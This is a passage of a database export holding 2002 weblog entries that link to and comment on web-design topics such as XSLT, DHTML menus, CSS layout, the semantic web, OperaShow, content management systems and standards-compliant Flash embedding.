		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.xfront.com/rescuing-xslt.html&quot;&gt;Rescuing XSLT from Niche Status&lt;/a&gt; is &lt;q cite=&quot;http://www.xfront.com/rescuing-xslt.html&quot;&gt;A Gentle Introduction to XSLT through HTML Templates&lt;/q&gt;. It is something of a hybrid article, consisting of a discussion of the problems involved with both teaching and learning XSLT followed by an excellent (if somewhat brief) tutorial covering the most important XSLT tags and concepts and how they can be used to convert a simple XML document in to XHTML.&lt;/p&gt;</field>
		<field name="created">2002-11-02 20:31:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">551</field>
		<field name="title">Sexy DHTML</field>
		<field name="slug">sexyDhtml</field>
		<field name="body">&lt;p&gt;The trend for DHTML using structural markup and the DOM continues with &lt;a href=&quot;http://www.gazingus.org/dhtml/?id=109&quot;&gt;Using Lists for DHTML Menus&lt;/a&gt;. Dave Lindquist uses identical XHTML markup combined with two different sets of JavaScript and CSS to implement both a set of dropdown menus and an expandable, tree style menu. The code is standards compliant and remarkably lightweight (&lt;a href=&quot;http://www.gazingus.org/js/menuExpandable.js&quot;&gt;menuExpandable.js&lt;/a&gt; weighs in at less than 20 lines) and fully accessible thanks to intelligent use of the accesskey attribute.&lt;/p&gt;

&lt;p&gt;More examples of this new-wave style of DHTML can be found in youngpup's &lt;a href=&quot;http://youngpup.net/?request=/articles/labels.xml&quot;&gt;Labels.js: A Re-Introduction to DHTML&lt;/a&gt; and Stuart's excellent &lt;a href=&quot;http://www.kryogenix.org/code/browser/aqtree2/&quot;&gt;aqTree2&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-02 20:44:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">552</field>
		<field name="title">Joe Gillespie does CSS</field>
		<field name="slug">joeGillespieDoesCSS</field>
		<field name="body">&lt;p&gt;Joe Gillespie has been introducing CSS to the readers of &lt;a href=&quot;http://www.wpdfd.com/&quot;&gt;Web Page Design for Designers&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wpdfd.com/editorial/wpd0902.htm#feature&quot;&gt;CSS Positioning - How the browsers cope&lt;/a&gt; (from September) discusses browser support and explains Joe's experience creating &lt;a href=&quot;http://www.funwithfonts.com/index.html&quot;&gt;Fun With Fonts&lt;/a&gt;, an experimental CSS site which demonstrates some intriguing new techniques.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wpdfd.com/editorial/wpd1002.htm#feature&quot;&gt;Thinking inside the box&lt;/a&gt; (from November) introduces the CSS box model (by comparing it to the more widely understood table cell) and shows how divs can be used for a simple column layout implemented with &lt;code&gt;float: left&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.wpdfd.com/editorial/wpd1102.htm#feature&quot;&gt;Box of Tricks&lt;/a&gt; (this month) gets serious with absolute positioning, a variety of link effects and a technique for implementing image rollovers without JavaScript.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Joe is a graphic designer with more than 20 years of experience and the fresh perspective he brings to CSS is inspiring to say the least. Unfortunately, as you might expect from a designer who &lt;q cite=&quot;http://www.netdiver.net/interviews/joegillespie.php&quot;&gt;has always worked in terms of &quot;gnat's whiskers&quot;&lt;/q&gt; (&lt;a href=&quot;http://www.netdiver.net/interviews/joegillespie.php&quot;&gt;netdiver interview&lt;/a&gt;), he is also a &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/08/31.html&quot; title=&quot;FontBitch, Defined.&quot;&gt;Font Bitch&lt;/a&gt;. I've recently found myself resizing text on web sites several times a day (not because they are unreadable but because it makes them more comfortable to read) so Mozilla's ability to resize even absolutely sized fonts is something of a God-send.&lt;/p&gt;</field>
		<field name="created">2002-11-02 21:53:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">553</field>
		<field name="title">The semantic web explained</field>
		<field name="slug">theSemanticWebExplained</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.decafbad.com/news_archives/000315.phtml&quot;&gt;What the frell is the Semantic Web?&lt;/a&gt; (&lt;a href=&quot;http://tidakada.com/archives/p/1939/more/1/c/1&quot; title=&quot;the semantic web for dummies&quot;&gt;via tidakada&lt;/a&gt;):&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.decafbad.com/news_archives/000315.phtml&quot;&gt;
&lt;p&gt;Imagine a document containing exactly all of the same info your weblog page presents - only the data is completely, easily accessible to a robot in a universal, easily handled format.&lt;/p&gt;

&lt;p&gt;Furthermore, imagine that the schema describing the data to be found on your page is in that same format. And then, imagine that the document describing the construction of schema is in that same format. And then imagine that the decomposition continues, all of the way down to base data types and relationships. Eventually, the whole thing rests on the back of a turtle - er I mean a sort of universal client.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the best introduction to the semantic web I've seen. I thought I'd &quot;got it&quot; after reading &lt;a href=&quot;http://www.ftrain.com/google_takes_all.html&quot;&gt;August 2009: How Google beat Amazon and Ebay to the Semantic Web&lt;/a&gt; but the idea of decomposing the relationships down to something universally understandable only just clicked (also thanks to a course on Logic and Semantics I am taking at University at the moment). I think I get RDF tuples now as well (there's a good introduction in &lt;a href=&quot;http://www.dbis.informatik.uni-frankfurt.de/~tolle/RDF/RDFIntro.html&quot; title=&quot;Introduction to RDF&quot;&gt;this document&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-11-03 13:34:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">554</field>
		<field name="title">Inline XML</field>
		<field name="slug">inlineXML</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.alistapart.com/stories/inlinexml/&quot;&gt;Inline XML&lt;/a&gt; explains how different XML languages can be embedded in XHTML documents using namespaces, and how they can then by styled using CSS.&lt;/p&gt;</field>
		<field name="created">2002-11-03 13:33:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">555</field>
		<field name="title">OperaShow</field>
		<field name="slug">operaShow</field>
		<field name="body">&lt;p&gt;It's been a while since I last looked at &lt;a href=&quot;http://www.tntluoma.com/opera/lover/&quot;&gt;30 Days to becoming an Opera Lover&lt;/a&gt; so it was a nice surprise to see that not only is the series now complete but Tim has started up &lt;a href=&quot;http://www.tntluoma.com/opera/beyond30/&quot; title=&quot;Beyond 30&quot;&gt;blog&lt;/a&gt; to continue the momentum. Flicking through the days I hadn't read before the single feature that impressed me most was OperaShow, described on &lt;a href=&quot;http://www.tntluoma.com/opera/lover/day17-operashow/&quot; title=&quot;Opera knows how to put on a Show&quot;&gt;Day 17&lt;/a&gt;. OperaShow is a variant of the full screen mode present in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; and Mozilla, but with the added ability to run PowerPoint style presentations. This is implemented using CSS and the projection media type, in conjunction with the &lt;code&gt;page-break-before : always;&lt;/code&gt; CSS property. Opera defaults to rendering the page normally (with whatever screen/all stylesheet the page author has provided) but as soon as you press F11 the projection style sheet comes in to effect. PgDown / PgUp can be used to cycle through the &quot;slides&quot; and the whole thing works just like a PowerPoint presentation.&lt;/p&gt;

&lt;p&gt;Further information on OperaShow can be found here:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.opera.com/support/tutorials/operashow/&quot;&gt;Opera.com's OperaShow Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://tntluoma.com/opera/operashow/molly/howitwasdone/&quot; title=&quot;Making yourself presentable How (and why) It Was Done&quot;&gt;A case study: Converting a powerpoint presentation to OperaShow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.philburns.com/quickshow.html&quot;&gt;QuickShow for Opera&lt;/a&gt; - a shareware application for authoring OperaShow presentations&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While playing around with the technology I found the following OperaShow enabled presentations:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.philburns.com/examples/Operashow.html&quot;&gt;The OperaShow Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://people.opera.com/howcome/2000/talks/may19-www9/index.xml&quot; title=&quot;XML in Opera&quot;&gt;An OperaShow presentation in XML&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.molly.com/presentations/accessibility/&quot;&gt;Section 508 and Accessibility for Web Sites&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I wonder if Rasmus Lerdorf has considered building OperaShow support in to his &lt;a href=&quot;http://pres.lerdorf.com/&quot;&gt;PHP Presentation System&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-03 14:32:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">556</field>
		<field name="title">Zend re-design... terrible!</field>
		<field name="slug">zendRedesign</field>
		<field name="body">&lt;p&gt;Zend (the commercial company behind the &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; scripting language) have launched a redesign of &lt;a href=&quot;http://www.zend.com/&quot;&gt;Zend.com&lt;/a&gt;. My verdict on the new design ... &lt;em&gt;terrible&lt;/em&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Non-standards compliant code and a huge mass of nested tables&lt;/li&gt;
&lt;li&gt;The main site navigation is a bunch of pull-down menus that don't work with javascript disabled (or in Opera)&lt;/li&gt;
&lt;li&gt;The fonts are tiny, and are sized using pixels meaning they can't be resized in IE.&lt;/li&gt;
&lt;li&gt;They haven't cleaned up the information architecture, which has been the worst part of the site for ages (there is still very little distinction provided between Articles, Tips, Columns, Tutorials and Code Gallery Spotlight)&lt;/li&gt;
&lt;li&gt;A lot of the navigation on the front page is images &lt;em&gt;with no alt attribute!&lt;/em&gt; - navigating the site in lynx is a case of trying to guess which [LINK] goes where&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The positives? Well, it works in Netscape 4. Wake up and smell the coffee guys, 1996 was a long time ago.&lt;/p&gt;</field>
		<field name="created">2002-11-03 20:58:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">557</field>
		<field name="title">Blogroll with a twist</field>
		<field name="slug">blogrollWithATwist</field>
		<field name="body">&lt;p&gt;Spotted in my referrals today: &lt;a href=&quot;http://readinged.com/&quot;&gt;ReadingEd.com&lt;/a&gt;. A promising new blog, well worth checking out for the innovative &quot;Outside Reading&quot; panel which uses the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; and some very funky javascript to pull in the &lt;acronym title=&quot;Rich Site Summary&quot;&gt;RSS&lt;/acronym&gt; feed (via a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; proxy) of the selected blog and load it in to a panel which appears on the left hand side. Browsers lacking in DOM support are served up standard links to the blog in question. The feature is explained in a bit more depth &lt;a href=&quot;http://www.readinged.com/index.php?id=P3&quot; title=&quot;Day One&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-04 23:59:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">558</field>
		<field name="title">Girlfriend as a case study</field>
		<field name="slug">girlfriendAsCaseStudy</field>
		<field name="body">&lt;p&gt;I've been helping my girlfriend recreate &lt;a href=&quot;http://www.natbat.co.uk/&quot; title=&quot;Natalie Downe&quot;&gt;her site&lt;/a&gt; using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and structural markup. She's new to web design and has been taking to CSS like a duck to water - as a veteran of Microsoft Word globally defined styles come to her naturally and she took very little time to cotton on to the importance of seperating presentation from content. I've shown her tables as well but she isn't really interested as she sees CSS as a much better solution for general presentation. I'm hoping to help run an  HTML/XHTML/CSS training course at the University early next year with a heavy emphasis on structural markup, standards compliance and accessibility so it's great to have a guinea pig to play with :)&lt;/p&gt;

&lt;p&gt;I also got her started with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;, which she is relishing as a far more pleasant alternative to coding things in Java (the language used on our course at Uni). Her site already features a simple shoutbox system and random quotes engine (both written by her) and she has plans for a whole load of other features. Pretty good going for someone with less than 5 hours of overall PHP experience.&lt;/p&gt;</field>
		<field name="created">2002-11-06 00:33:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">559</field>
		<field name="title">Asilomar Institute</field>
		<field name="slug">asilomarInstitute</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://aifia.org/&quot;&gt;Asilomar Institute for Information Architecture&lt;/a&gt; - very promising organisation, great site but I have to admit I'm not too keen on the name (though I'm sure it will grow on me). The highlight of the site for me has to be the &lt;a href=&quot;http://aifia.org/pg/25_theses.php&quot;&gt;25 Theses&lt;/a&gt;, which provide an excellent condensed description of what &lt;acronym title=&quot;Information Architecture&quot;&gt;IA&lt;/acronym&gt; is and why it is necessary. The site lead me to make my first impulse buy in quite a while, so with a bit of luck from Amazon Christina Wodtke's &lt;a href=&quot;http://www.amazon.com/o/ASIN/0735712506&quot;&gt;Information Architecture: Blueprints for the Web&lt;/a&gt; should be with me in the morning.&lt;/p&gt;</field>
		<field name="created">2002-11-06 00:50:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">560</field>
		<field name="title">Funky new use for CSS backgrounds</field>
		<field name="slug">funkyNewUseForCssBackgrounds</field>
		<field name="body">&lt;p&gt;Jeffrey Zeldman &lt;a href=&quot;http://www.zeldman.com/daily/1102a.shtml#vote&quot; title=&quot;5 November 2002&quot;&gt;points&lt;/a&gt; to the newly redesigned &lt;a href=&quot;http://v-2.org/&quot;&gt;v-2 Organisation&lt;/a&gt; site, which features a clever technique whereby a large background image is displayed &quot;widescreen&quot; style with different amounts of the photo visible depending on the resolution / width of your browser. Try doing that with standard tables ;) The (unaltered) colours in the photograph cleverly match the colours of the site itself.&lt;/p&gt;</field>
		<field name="created">2002-11-06 00:58:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">561</field>
		<field name="title">Hide Mozilla Flash ads</field>
		<field name="slug">hideMozillaFlashAds</field>
		<field name="body">&lt;p&gt;Michel: &lt;a href=&quot;http://tidakada.com/archives/p/1941/more/1/c/1&quot;&gt;How to hide Flash banner ads in Mozilla&lt;/a&gt; using a few lines of CSS added to the &lt;code&gt;userContent.css&lt;/code&gt; file. A great example of CSS2 selectors at work.&lt;/p&gt;</field>
		<field name="created">2002-11-06 01:15:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">562</field>
		<field name="title">CMS roundup</field>
		<field name="slug">cmsRoundup</field>
		<field name="body">&lt;p&gt;It seems &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; news is like buses - nothing for weeks, then three items come along at once. Jeremy Zawodny has been &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000292.html#000292&quot; title=&quot;Bricolage&quot;&gt;very impressed&lt;/a&gt; by &lt;a href=&quot;http://bricolage.cc/&quot;&gt;Bricolage&lt;/a&gt;, an Open Source CMS built on mod_perl, the HTML::Mason template system and PostgreSQL. Meanwhile, Scott Andrew has been praising liveSTORYBOARD on &lt;a href=&quot;http://www.webstandards.org/buzz/archive/2002_11.html#a000106&quot; title=&quot;Valid approaches to Content Management&quot;&gt;the WaSP site&lt;/a&gt;. &lt;a href=&quot;http://www.livestoryboard.com/&quot;&gt;liveSTORYBOARD&lt;/a&gt; is a hosted solution which promises ease of use through a web based interface and fully standards compliant output (hence the plug on WaSP). Finally, Think Secret have broken the news that Macromedia are &lt;a href=&quot;http://www.thinksecret.com/news/macromediac.html&quot; title=&quot;Macromedia to announce new web content software&quot;&gt;soon to announce&lt;/a&gt; Contribute, a new CMS built on top of their popular Dreamweaver &lt;acronym title=&quot;What You See Is What You Get&quot;&gt;WYSIWYG&lt;/acronym&gt; editor (&lt;a href=&quot;http://www.web-graphics.com/mtarchive/000690.php#000690&quot; title=&quot;A Content Managament System from Macromedia?&quot;&gt;via webgraphics&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-11-06 10:08:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">563</field>
		<field name="title">IA has arrived</field>
		<field name="slug">iaHasArrived</field>
		<field name="body">&lt;p&gt;Christina Wodtke: &lt;a href=&quot;http://www.eleganthack.com/archives/003063.html#003063&quot; title=&quot;A refuge in the data sea&quot;&gt;Information Architecture has arrived&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.eleganthack.com/archives/003063.html#003063&quot;&gt;&lt;p&gt;What's led me to the conclusion IA has arrived? Articles on IA are seen in every
 publication that addresses the web, from engineering to design. A recent search
 turned up 188,000 results on &quot;Information Architecture&quot;. Information
 Architecture for the World Wide Web has gone to second edition, Information
 Architecture: Blueprints for the Web hit the best seller list on Amazon in its
 second week on the stands, and three more books on IA are scheduled to come out
 next year. Jobs for Information Architects are found on most job sites, but
 more importantly, information architecture is listed as a skill for designers
 and programmers alike. And finally, the Asilomar Institute for Information
 Architecture launched Monday-the first organization dedicated to promoting and
 advancing Information Architecture. These are heady times for information
 professionals.&lt;/p&gt;&lt;/blockquote&gt;

 &lt;p&gt;I'm nearly half way through &quot;Blueprints for the Web&quot; now - I'll post a review of it once I've had time to read and digest it all but impressions so far are very favourable.&lt;/p&gt;</field>
		<field name="created">2002-11-06 17:30:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">564</field>
		<field name="title">aqTree 3</field>
		<field name="slug">aqTree3</field>
		<field name="body">&lt;p&gt;Stuart has released &lt;a href=&quot;http://www.kryogenix.org/code/browser/aqlists/&quot;&gt;aqTree3&lt;/a&gt;, an upgrade to previous aqTree versions which takes in to account some of the best ideas from both Eric Meyer's &lt;a href=&quot;http://www.meyerweb.com/eric/css/edge/menus/demo.html&quot;&gt;pure CSS menus&lt;/a&gt; and Dave Lindquist's recently released &lt;a href=&quot;http://www.gazingus.org/dhtml/?id=109&quot; title=&quot;Using Lists for DHTML Menus&quot;&gt;drop-down / expandable trees&lt;/a&gt;. aqTree's great strength is that it requires no additional markup at all on top of the nested lists, other than a class definition which the script will pick up via the DOM. All presentation and positioning is now controlled with CSS applied to the list structure (previous versions of aqTree used the DOM to transform the list in to DIVs) and Stuart has included an extra script, aqdd, to handle drop down menus as well. The article includes a mini-essay on how elegant DHTML should be implemented, which is well worth reading.&lt;/p&gt;</field>
		<field name="created">2002-11-07 18:16:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">565</field>
		<field name="title">Validating weblog entries</field>
		<field name="slug">validatingWeblogEntries</field>
		<field name="body">&lt;p&gt;webgraphics have an &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000693.php#000693&quot; title=&quot;Request for a Weblog Entry Validator&quot;&gt;interesting discussion&lt;/a&gt; running about the need for a weblog entry &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; validator. Dave Lindquist suggests using his &lt;a href=&quot;http://gazingus.org/js/?id=104&quot;&gt;JavaScript XML Parser&lt;/a&gt; to perform validation on the client side, which seems like an excellent solution. I already use PHP's XML parsing functions on this blog to check my entries are valid XML when I post them (and extract links for use with my pingback client) but additional client side validation would save the round trip to the server. The discussion also covers the idea of using the W3C's validator to check entries - as soon as they finalise their XML interface (as used by my &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/28/#w3cValidatorWebService&quot;&gt;validator web service&lt;/a&gt;) I can see a lot of interest forming in this kind of automated validation.&lt;/p&gt;</field>
		<field name="created">2002-11-07 21:47:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">566</field>
		<field name="title">Javascript XML parser</field>
		<field name="slug">javascriptXmlParser</field>
		<field name="body">&lt;p&gt;I've added Dave Lindquist's &lt;a href=&quot;http://www.gazingus.org/js/?id=104&quot;&gt;Javascript XML parser&lt;/a&gt; to my blog entry form using the code he posted in the &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000693.php#000693&quot; title=&quot;Request for a Weblog Entry Validator&quot;&gt;discussion on webgraphics&lt;/a&gt;. It works an absolute treat - it even pops up an alert message telling me what is wrong with the post (usually 'End tag does not match opening tag') and won't let me submit the form until I have fixed the error. The actual XML parsing library is a truly impressive piece of work, despite the lack of documentation. Dave suggests that it is pretty much obsolete now that most modern browsers have a built in XML parser accessible through scripting, but his parser is easily fast enough for my purposes.&lt;/p&gt;</field>
		<field name="created">2002-11-07 22:08:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">567</field>
		<field name="title">Web services in action</field>
		<field name="slug">webServicesInAction</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://allconsuming.net/&quot;&gt;All Consuming&lt;/a&gt; is another one of those information-about-weblogs sites, but with a heavy emphasis on books:&lt;/p&gt;

&lt;blockquote cite=&quot;http://allconsuming.net/#whatisthis&quot;&gt;&lt;p&gt;
This page is the result of several different processes. Inspired by Book Watch, I created a script that visits newly updated weblogs hourly via Weblogs.com [...] The script then looks for links to Amazon.com items and saves them. I then aggregate all that information together to find the most frequently mentioned books. My scoring mechanism is weighted to favor recently mentioned books, so that the list remains fresh, and offers new insight into what the weblog community is reading at the moment.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The site is a great example of web services in action - it pulls what's related information from Google, book information from Amazon and even uses &lt;a href=&quot;http://alexa.com/&quot;&gt;Alexa&lt;/a&gt; to snag a screenshot of the blog in question. Most impressive of all is the &quot;edit friends list&quot; feature (which you can only play with if you log in to the site - account creation is utterly painless though) which identifies possible friends of your blog based on blo.gs friends, Google related sites and blogs who have read the same books as you. Check the ones you want on your friends list and optionally used to send you book recommendations. Practically everything is syndicated (have a root around in the site's &lt;a href=&quot;http://www.allconsuming.net/xml/&quot; title=&quot;Index of /xml&quot;&gt;XML directory&lt;/a&gt; to see quite how much information is available) and the site even offers javascript based syndication for those without the ability to use XML feeds.&lt;/p&gt;</field>
		<field name="created">2002-11-08 12:37:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">568</field>
		<field name="title">URLs matter</field>
		<field name="slug">urlsMatter</field>
		<field name="body">&lt;p&gt;Jeremy Zawodny &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000296.html#000296&quot; title=&quot;URLs Matter. A lot.&quot;&gt;talks about URLs&lt;/a&gt;, and describes a recent internal Yahoo discussion over how the URLs for their stock tickers should work. His points in favour of short, simple URLs are particularly worth noting:&lt;/p&gt;
&lt;blockquote cite=&quot;&quot;&gt;
&lt;ul&gt;
&lt;li&gt;Short URLs mail better. They don't wrap and break.&lt;/li&gt;
&lt;li&gt;Short URLs are easy to read over the phone.&lt;/li&gt;
&lt;li&gt;Short URLs can be memorized when used often enough.&lt;/li&gt;
&lt;li&gt;Guessable URLs keep the hackers and geeks happy without affecting the 99.9% of normal users at all.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;With benefits like that, I just don't understand why so many sites (especially those running a &lt;a href=&quot;http://www.vignette.com/&quot;&gt;CMS costing hundreds of thousands of pounds&lt;/a&gt;) continue to use &lt;a href=&quot;http://www.vignette.com/contentmanagement/0,2097,1-1-1025-669-1032-3593,00.html&quot;&gt;hideously long and illogical URLs&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-08 12:43:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">569</field>
		<field name="title">Content to code ratio</field>
		<field name="slug">contentToCodeRatio</field>
		<field name="body">&lt;p&gt;Adrian Holovaty has been investigating the &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/11/07/2226&quot;&gt;content-to-code ratio&lt;/a&gt; of various news sites compared to various blogs. Unsurprisingly the blogs win hands down due to the tendancy to use CSS to separate structure from presentation. Adrian has put together a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; script to calculate the ratio which can be &lt;a href=&quot;http://www.holovaty.com/tools/getcontentsize/&quot; title=&quot;GetContentSize&quot;&gt;accessed online&lt;/a&gt; or &lt;a href=&quot;http://www.holovaty.com/tools/getcontentsize/GetContentSizePage.class.txt&quot; title=&quot;GetContentSizePage.class&quot;&gt;downloaded&lt;/a&gt; for personal use. Incidentally, from the comments in the code I learnt that PHP's &lt;code&gt;strip_tags()&lt;/code&gt; function neglects to strip the --&amp;gt; at the end of an HTML comment.&lt;/p&gt;</field>
		<field name="created">2002-11-08 12:50:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">570</field>
		<field name="title">Object persistence</field>
		<field name="slug">objectPersistence</field>
		<field name="body">&lt;p&gt;Simon Brunning &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000526.html#000526&quot; title=&quot;Persistence&quot;&gt;talks about persistence&lt;/a&gt;, and how much more complicated it is now that objects are involved. The best explanation I've seen of how objects and relational databases can be used together was in Martin Fowler's &lt;a href=&quot;http://www.amazon.com/exec/obidos/ASIN/0321127420/104-1365940-3319951&quot;&gt;Patterns of Enterprise Application Architecture&lt;/a&gt;, but now that the book has been published he has removed the &lt;a href=&quot;http://www.martinfowler.com/isa/index.html&quot; title=&quot;ISA is now closed&quot;&gt;online version&lt;/a&gt;. IBM's DeveloperWorks has a new article up describing &lt;a href=&quot;http://www-106.ibm.com/developerworks/linux/library/l-pypers.html&quot; title=&quot;Python persistence management&quot;&gt;persistence management in Python&lt;/a&gt;, which talks in details about Python's native serialization method (pickling) but only mentions &lt;acronym title=&quot;Zope Object DataBase&quot;&gt;ZODB&lt;/acronym&gt; in passing. I agree with Simon - object databases just don't seem as elegant a solution as &lt;acronym title=&quot;Relational DataBase Management System&quot;&gt;RDBMS&lt;/acronym&gt;s. Object databases may provide persistence but they don't seem nearly as powerful as relational databases when it comes to flexibility of accessing data.&lt;/p&gt;</field>
		<field name="created">2002-11-08 14:36:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">571</field>
		<field name="title">Clean URLs</field>
		<field name="slug">cleanURLs</field>
		<field name="body">&lt;p&gt;Handy bookmark for bloggers who wish to validate: &lt;a href=&quot;http://www3.sympatico.ca/dylanfoley/stacks/1102.html#cleanURL&quot;&gt;cleanURL&lt;/a&gt;. It gives you the URL of the current page with all &amp;amp;s replaced with &amp;amp;amp;, ready to be posted in to a blog entry. Unescaped ampersands are one of the most common causes of invalidity on my blog so this is going to come in very handy.&lt;/p&gt;</field>
		<field name="created">2002-11-08 14:44:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">572</field>
		<field name="title">At frigging last</field>
		<field name="slug">atFriggingLast</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.zeldman.com/daily/1102a.shtml#lean&quot; title=&quot;8 November 2002&quot;&gt;Jeffrey Zeldman&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.zeldman.com/daily/1102a.shtml#lean&quot;&gt;&lt;p&gt;
The next issue of A List Apart will publish a technique allowing designers to embed Flash movies while adhering to W3C specs and eliminating code bloat. No, really. Watch this space.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-11-08 18:54:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">573</field>
		<field name="title">Dspace</field>
		<field name="slug">dSpace</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://dspace.org/&quot;&gt;Dspace&lt;/a&gt; (via &lt;a href=&quot;http://swannieuk.blogspot.com/2002_11_03_swannieuk_archive.html&quot;&gt;Swannie&lt;/a&gt;) is an open source platform that helps institutions archive, manage and distribute &quot;digital works&quot; over the long term. It appears to be a variant on the idea of a content management system, but with a heavy emphasis on academic works and multiple formats. The system is implemented in Java (with a JSP front end) and uses a PostgreSQL for the metadata (based on Dublin Core) and relataional information. The assets can be stored in a variety of ways (filesystems, WebDAV, database BLOBS are all mentioned) via an abstraction layer known as a &quot;bitstream&quot;. The system was developed by MIT and HP and has &lt;a href=&quot;http://libraries.mit.edu/dspace&quot; title=&quot;Dspace at MIT&quot;&gt;gone live&lt;/a&gt; for use by MIT's academic departments. Interesting stuff.&lt;/p&gt;</field>
		<field name="created">2002-11-09 18:31:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">574</field>
		<field name="title">Standards compliant Flash</field>
		<field name="slug">standardsCompliantFlash</field>
		<field name="body">&lt;p&gt;And here it is: &lt;a href=&quot;http://www.alistapart.com/stories/flashsatay/&quot;&gt;Flash Satay - Embedding Flash while Supporting Standards&lt;/a&gt;. It involves jumping througg a few hoops but the end result is a nice chunk of standards compliant code that can be used to embed flash movies without invalidating the markup of a page. The article also includes a nice example of how to use the &lt;code&gt;object&lt;/code&gt; tag to serve up alternative content - by nesting an image (or other HTML) inside the tag browsers that do not support content with a mime-type of &lt;code&gt;application/x-shockwave-flash&lt;/code&gt; will have something to display in place of the Flash file.&lt;/p&gt;</field>
		<field name="created">2002-11-09 20:45:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">575</field>
		<field name="title">The case against</field>
		<field name="slug">theCaseAgainst</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://sillydog.org/msbad.html&quot;&gt;What's So Bad About Microsoft?&lt;/a&gt; - a nice reference point for all us dissidents :)&lt;/p&gt;</field>
		<field name="created">2002-11-09 20:47:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">576</field>
		<field name="title">PHP4 and Apache 2 on Windows</field>
		<field name="slug">php4andApache2onWindows</field>
